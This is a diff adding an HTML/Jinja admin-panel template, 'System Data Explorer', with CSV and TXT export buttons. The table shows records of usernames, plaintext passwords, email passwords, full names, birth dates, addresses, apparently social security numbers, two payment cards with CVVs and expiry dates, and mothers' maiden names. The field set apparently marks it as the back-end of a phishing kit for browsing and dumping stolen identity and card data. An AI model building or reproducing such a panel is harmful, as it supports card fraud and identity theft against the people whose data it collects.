@@ -1,0 +1,255 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel | Database Test</title>
+    <style>
+        :root {
+            --blue-primary: #0056b3;
+            --blue-light: #e7f1ff;
+            --blue-hover: #d0e3ff;
+            --white: #ffffff;
+            --text-dark: #333333;
+            --border-color: #dee2e6;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            color: var(--text-dark);
+        }
+
+        /* Header */
+        header {
+            background-color: var(--blue-primary);
+            color: var(--white);
+            padding: 1.5rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        header h1 { margin: 0; font-size: 1.4rem; text-transform: uppercase; letter-spacing: 1px; }
+
+        /* Toolbar */
+        .toolbar {
+            background: var(--white);
+            padding: 15px 30px;
+            display: flex;
+            gap: 12px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .btn {
+            padding: 8px 18px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s;
+            font-size: 0.85rem;
+        }
+
+        .btn-csv { background-color: var(--blue-primary); color: white; }
+        .btn-txt { background-color: #555; color: white; }
+        .btn:hover { opacity: 0.9; transform: translateY(-1px); }
+
+        /* Table Area */
+        .content { padding: 25px; }
+
+        .table-container {
+            background: var(--white);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .scroll-wrapper {
+            overflow-x: auto; /* Required for 21 columns */
+            width: 100%;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 2800px; /* High width to keep data on one line */
+        }
+
+        thead {
+            background-color: var(--blue-primary);
+            color: white;
+        }
+
+        th {
+            padding: 15px;
+            text-align: left;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            border-right: 1px solid rgba(255,255,255,0.1);
+        }
+
+        td {
+            padding: 12px 15px;
+            border-bottom: 1px solid var(--border-color);
+            font-size: 0.85rem;
+            white-space: nowrap;
+        }
+
+        tbody tr:nth-child(even) { background-color: var(--blue-light); }
+        tbody tr:hover { background-color: var(--blue-hover); }
+
+        /* Data specific styling */
+        .id-cell { font-weight: bold; color: var(--blue-primary); }
+        .code-font {
+            font-family: 'Consolas', monospace;
+            background: #f1f1f1;
+            padding: 2px 5px;
+            border-radius: 3px;
+            color: #d63384;
+        }
+        .badge-count {
+            background: white;
+            color: var(--blue-primary);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>System Data Explorer</h1>
+    <div class="badge-count">Records: {{ info|length }}</div>
+</header>
+
+<div class="toolbar">
+    <button class="btn btn-csv" onclick="exportTableToCSV('database_dump.csv')">Export to CSV</button>
+    <button class="btn btn-txt" onclick="exportTableToTXT('database_dump.txt')">Export to TXT</button>
+</div>
+
+<div class="content">
+    <div class="table-container">
+        <div class="scroll-wrapper">
+            <table id="myTable">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>Email</th>
+                        <th>Email Pass</th>
+                        <th>Full Name</th>
+                        <th>DOB</th>
+                        <th>Address</th>
+                        <th>State</th>
+                        <th>Zip</th>
+                        <th>Phone</th>
+                        <th>SSS</th>
+                        <th>Card #1</th>
+                        <th>CVV1</th>
+                        <th>Exp1</th>
+                        <th>Sims1</th>
+                        <th>MMN</th>
+                        <th>Card #2</th>
+                        <th>CVV2</th>
+                        <th>Exp2</th>
+                        <th>Sims2</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for row in info %}
+                    <tr>
+                        <td class="id-cell">{{ row.id }}</td>
+                        <td>{{ row.username }}</td>
+                        <td class="code-font">{{ row.password }}</td>
+                        <td>{{ row.email }}</td>
+                        <td class="code-font">{{ row.mail_pss }}</td>
+                        <td>{{ row.fullname }}</td>
+                        <td>{{ row.dob }}</td>
+                        <td>{{ row.street_address }}</td>
+                        <td>{{ row.state }}</td>
+                        <td>{{ row.zip_code }}</td>
+                        <td>{{ row.phone }}</td>
+                        <td>{{ row.sss }}</td>
+                        <td class="code-font">{{ row.card_d }}</td>
+                        <td>{{ row.ccc }}</td>
+                        <td>{{ row.exp_date }}</td>
+                        <td>{{ row.sims }}</td>
+                        <td>{{ row.mmn }}</td>
+                        <td class="code-font">{{ row.card_d2 }}</td>
+                        <td>{{ row.ccc2 }}</td>
+                        <td>{{ row.exp_date2 }}</td>
+                        <td>{{ row.sims2 }}</td>
+                    </tr>
+                    {% else %}
+                    <tr>
+                        <td colspan="21" style="text-align: center; padding: 40px; color: #666;">No data currently available in the database.</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<script>
+    // --- CSV EXPORTER ---
+    function exportTableToCSV(filename) {
+        let csv = [];
+        let rows = document.querySelectorAll("table tr");
+        
+        for (let i = 0; i < rows.length; i++) {
+            let row = [], cols = rows[i].querySelectorAll("td, th");
+            for (let j = 0; j < cols.length; j++) {
+                // Remove extra whitespace and wrap in quotes to handle commas in addresses
+                let data = cols[j].innerText.replace(/(\r\n|\n|\r)/gm, "").replace(/"/g, '""');
+                row.push('"' + data + '"');
+            }
+            csv.push(row.join(","));
+        }
+        downloadFile(csv.join("\n"), filename, 'text/csv;charset=utf-8;');
+    }
+
+    // --- TXT EXPORTER ---
+    function exportTableToTXT(filename) {
+        let txt = "DATABASE EXPORT LOG\n" + "=".repeat(60) + "\n\n";
+        let rows = document.querySelectorAll("table tbody tr");
+        let headers = document.querySelectorAll("table thead th");
+
+        rows.forEach((row, index) => {
+            let cols = row.querySelectorAll("td");
+            if(cols.length > 1) { // Skip "No Data" row
+                txt += `ENTRY [${index + 1}]\n` + "-".repeat(30) + "\n";
+                cols.forEach((col, i) => {
+                    txt += `${headers[i].innerText.padEnd(15)}: ${col.innerText}\n`;
+                });
+                txt += "\n";
+            }
+        });
+
+        downloadFile(txt, filename, 'text/plain;charset=utf-8;');
+    }
+
+    // --- DOWNLOAD HELPER ---
+    function downloadFile(content, filename, contentType) {
+        let blob = new Blob([content], { type: contentType });
+        let link = document.createElement("a");
+        let url = URL.createObjectURL(blob);
+        link.setAttribute("href", url);
+        link.setAttribute("download", filename);
+        link.style.visibility = 'hidden';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+</script>
+
+</body>
+</html>
